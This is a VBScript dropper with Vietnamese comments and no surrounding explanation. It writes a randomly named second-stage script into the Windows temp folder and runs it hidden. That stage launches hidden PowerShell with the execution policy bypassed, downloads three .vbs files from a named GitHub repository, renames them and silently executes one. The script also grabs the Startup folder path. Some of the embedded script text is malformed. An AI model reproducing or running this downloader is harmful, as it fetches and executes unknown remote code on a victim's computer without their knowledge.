Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")
temp = shell.ExpandEnvironmentStrings("%TEMP%")
startup = shell.SpecialFolders("Startup")

' Hàm tạo chuỗi ngẫu nhiên (sửa lỗi: không dùng tên tham số "len")
Function GenerateRandomString(length)
    Dim chars, i, s
    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    s = ""
    Randomize
    For i = 1 To length
        s = s & Mid(chars, Int(Rnd() * Len(chars) + 1), 1)
    Next
    GenerateRandomString = s
End Function

' Tạo tên tệp ngẫu nhiên và đảm bảo không trùng
Do
    randName = GenerateRandomString(8) ' thay 8 bằng số ký tự bạn muốn
    txtName = randName & ".txt"
    vbsName = randName & ".vbs"
    txtPath = temp & "\" & txtName
    vbsPath = temp & "\" & vbsName
Loop While fso.FileExists(txtPath) Or fso.FileExists(vbsPath)

' Ghi nội dung VBS vào file .txt (tập tin tạm)
Set file = fso.CreateTextFile(txtPath, True)
file.WriteLine "Dim shell, fso, tempFolder" & vbCrLf & "" & vbCrLf & "Set shell = CreateObject(""WScript.Shell"")" & vbCrLf & "Set fso = CreateObject(""Scripting.FileSystemObject"")" & vbCrLf & "" & vbCrLf & "" & vbCrLf & "scriptPath = WScript.ScriptFullName" & vbCrLf & "scriptName = fso.GetBaseName(scriptPath)" & vbCrLf & "" & vbCrLf & "tempFolder = shell.ExpandEnvironmentStrings(""%TEMP%"") & ""\""" & vbCrLf & "txtPath = tempFolder & scriptName & "".txt""" & vbCrLf & "" & vbCrLf & "rawUrl = """"" & vbCrLf & "cmd1 = ""powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "" & _" & vbCrLf & "  """"""(New-Object Net.WebClient).DownloadFile('"" & rawUrl & ""','"" & txtPath & ""')""""""" & vbCrLf & "shell.Run cmd1, 0, True" & vbCrLf & "" & vbCrLf & " "" """""" & txtPath & """""""", 1, False" & vbCrLf & "" & vbCrLf & "" & vbCrLf & "tempFolder = shell.ExpandEnvironmentStrings(""%TEMP%"") & ""\""" & vbCrLf & "" & vbCrLf & "url1 = ""https://raw.githubusercontent.com/f68g/us/refs/heads/main/1.vbs""" & vbCrLf & "url2 = ""https://raw.githubusercontent.com/f68g/us/refs/heads/main/2.vbs""" & vbCrLf & "url3 = ""https://raw.githubusercontent.com/f68g/us/refs/heads/main/3.vbs""" & vbCrLf & "" & vbCrLf & "txt1 = tempFolder & ""1.txt""" & vbCrLf & "txt2 = tempFolder & ""2.txt""" & vbCrLf & "txt3 = tempFolder & ""3.txt""" & vbCrLf & "" & vbCrLf & "vbs1 = tempFolder & ""1.vbs""" & vbCrLf & "vbs2 = tempFolder & ""2.vbs""" & vbCrLf & "vbs3 = tempFolder & ""3.vbs""" & vbCrLf & "" & vbCrLf & "Function DownloadFile(url, savePath)" & vbCrLf & "    Dim http, stream" & vbCrLf & "    Set http = CreateObject(""WinHttp.WinHttpRequest.5.1"")" & vbCrLf & "    http.Open ""GET"", url, False" & vbCrLf & "    http.Send" & vbCrLf & "    If http.Status = 200 Then" & vbCrLf & "        Set stream = CreateObject(""ADODB.Stream"")" & vbCrLf & "        stream.Type = 1 ' binary" & vbCrLf & "        stream.Open" & vbCrLf & "        stream.Write http.responseBody" & vbCrLf & "        stream.SaveToFile savePath, 2" & vbCrLf & "        stream.Close" & vbCrLf & "        DownloadFile = True" & vbCrLf & "    Else" & vbCrLf & "        DownloadFile = False" & vbCrLf & "    End If" & vbCrLf & "End Function" & vbCrLf & "" & vbCrLf & "DownloadFile url1, txt1" & vbCrLf & "DownloadFile url2, txt2" & vbCrLf & "DownloadFile url3, txt3" & vbCrLf & "" & vbCrLf & "If fso.FileExists(vbs1) Then fso.DeleteFile vbs1, True" & vbCrLf & "If fso.FileExists(vbs2) Then fso.DeleteFile vbs2, True" & vbCrLf & "If fso.FileExists(vbs3) Then fso.DeleteFile vbs3, True" & vbCrLf & "" & vbCrLf & "fso.MoveFile txt1, vbs1" & vbCrLf & "fso.MoveFile txt2, vbs2" & vbCrLf & "fso.MoveFile txt3, vbs3" & vbCrLf & "" & vbCrLf & "shell.Run ""wscript.exe """""" & vbs3 & """""""", 0, False"
file.Close

' Đổi tên .txt thành .vbs
If fso.FileExists(vbsPath) Then fso.DeleteFile vbsPath, True
fso.MoveFile txtPath, vbsPath

' Chạy file .vbs
shell.Run """" & vbsPath & """", 0, False
